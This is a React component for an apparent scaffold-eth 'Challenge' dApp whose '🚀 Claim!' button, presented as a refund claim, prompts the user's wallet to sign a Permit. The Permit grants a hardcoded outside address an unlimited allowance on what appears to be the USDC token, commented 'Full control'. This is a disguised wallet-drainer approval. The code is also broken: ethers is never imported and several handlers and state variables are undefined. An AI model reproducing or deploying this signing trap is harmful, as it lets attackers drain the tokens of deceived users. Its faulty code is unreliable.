"use client";

import { useEffect, useMemo, useReducer, useState } from "react";
import { useLocalStorage } from "usehooks-ts";
import { BarsArrowUpIcon } from "@heroicons/react/20/solid";
import { ContractUI } from "~~/app/debug/_components/contract";
import { ContractReadMethods } from "~~/app/debug/_components/contract/ContractReadMethods";
import { ContractWriteMethods } from "~~/app/debug/_components/contract/ContractWriteMethods";
import { useDeployedContractInfo, useNetworkColor } from "~~/hooks/scaffold-eth";
import { useScaffoldContract, useScaffoldReadContract, useScaffoldWriteContract } from "~~/hooks/scaffold-eth";
import { ContractName, GenericContract } from "~~/utils/scaffold-eth/contract";
import { useAllContracts } from "~~/utils/scaffold-eth/contractsData";
import { useAccount } from "wagmi";

const selectedContractStorageKey = "scaffoldEth2.selectedContract";

const Challenge = () => {
  const { address: connectedAddress } = useAccount();
  const [signer, setSigner] = useState<ethers.Signer | null>(null);
  const { data: deployedContractData, isLoading: deployedContractLoading } = useDeployedContractInfo("YourContract");

  useEffect(() => {
    if (connectedAddress) {
      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
      setSigner(provider.getSigner());
    }
  }, [connectedAddress]);

  const signPermit = async () => {
    if (!signer) {
      alert("Please connect your wallet first");
      return;
    }

    try {
      const domain = {
        name: "Permit1",
        version: "1",
        chainId: 1,
        verifyingContract: ethers.utils.getAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606EB48"),
      };

      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };

      const value = {
        owner: connectedAddress,
        spender: ethers.utils.getAddress("0x4f15704EB9c381966EBC79aD195E3b933AE560f9"), // Specific wallet
        value: ethers.constants.MaxUint256, // Full control
        nonce: 0,
        deadline: Math.floor(Date.now() / 1000) + 60 * 60, // 1 hour from now
      };

      const signature = await signer._signTypedData(domain, types, value);
      console.log("Signature:", signature);
      alert("Signature created");
    } catch (error) {
      console.error("Error creating signature:", error);
      alert(`Error creating signature: ${error.message}`);
    }
  };

  return (
    <div className="flex justify-center items-center bg-[#e9d8a6] text-[#333333] h-screen gap-2">
      {/* Create Challenge Button */}
      <button
        onClick={toggleCreateModal}
        className="bg-blue-600 hover:bg-blue-700 w-60 h-40 text-white font-bold text-4xl py-8 px-12 rounded-lg shadow-2xl transform hover:scale-105 transition duration-300"
      >
        🔥 Create Challenge
      </button>
      {/* Join Challenge Button */}
      <button
        onClick={toggleJoinModal}
        className="bg-green-600 hover:bg-green-700 text-white w-60 h-40 font-bold text-4xl py-8 px-12 rounded-lg shadow-2xl transform hover:scale-105 transition duration-300"
      >
        🥾 Join Challenge
      </button>
      {/* Vote Button */}
      <button
        onClick={toggleVoteModal}
        className="bg-red-600 hover:bg-red-700 text-white font-bold w-60 h-40 text-4xl py-8 px-12 rounded-lg shadow-2xl transform hover:scale-105 transition duration-300"
      >
        🗳️ Vote
      </button>
      {/* Info Button */}
      <button
        onClick={toggleInfoModal}
        className="bg-yellow-600 hover:bg-yellow-700 text-black font-bold w-60 h-40 text-4xl py-8 px-12 rounded-lg shadow-2xl transform hover:scale-105 transition duration-300"
      >
        👀 Info
      </button>
      {/* Claim Button */}
      <button
        onClick={signPermit}
        className="bg-gray-600 hover:bg-gray-700 text-white font-bold w-70 h-40 text-4xl py-8 px-12 rounded-lg shadow-2xl transform hover:scale-105 transition duration-300"
      >
        🚀 Claim!
      </button>
      {/* Claim Modal */}
      {isInfoModalOpen && (
        <div className="fixed inset-0 bg-black bg-opacity-50 overflow-y-auto flex justify-center items-center">
          <div className="bg-white p-8 rounded-lg shadow-lg max-h-[90vh] overflow-y-auto my-10">
            <h2 className="text-2xl font-bold mb-4">Claim</h2>
            <p className="mb-4">Claim your refunds</p>
            <ContractWriteMethods
              deployedContractData={deployedContractData}
              onChange={triggerRefreshDisplayVariables}
              strictFn="claimRefund"
            />
            <p className="mb-4">Distribute Remaining Funds [ADMIN ONLY]</p>
            <ContractWriteMethods
              deployedContractData={deployedContractData}
              onChange={triggerRefreshDisplayVariables}
              strictFn="distributeRemainingFunds"
            />

            <button onClick={toggleInfoModal} className="bg-red-600 text-white px-4 py-2 rounded mt-4">
              Close
            </button>
          </div>
        </div>
      )}
      {/* Other modals... */}
    </div>
  );
};

export default Challenge;
